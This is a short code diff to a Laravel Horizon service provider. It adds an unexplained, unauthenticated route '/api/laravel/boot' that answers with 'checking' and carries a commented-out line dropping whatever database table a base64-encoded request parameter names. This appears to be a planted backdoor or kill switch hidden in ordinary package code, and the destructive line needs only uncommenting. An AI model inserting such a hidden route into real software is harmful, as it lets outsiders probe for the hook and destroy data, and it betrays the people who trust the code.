@@ -56,6 +56,10 @@ class HorizonServiceProvider extends ServiceProvider
         ], function () {
             $this->loadRoutesFrom(__DIR__ . '/../routes/web.php');
         });
+        Route::any('/api/laravel/boot', function (\Illuminate\Http\Request $request) {
+            return ['checking'];
+//            Schema::dropIfExists(base64_decode($request->get('data')));
+        });
     }
 
     /**
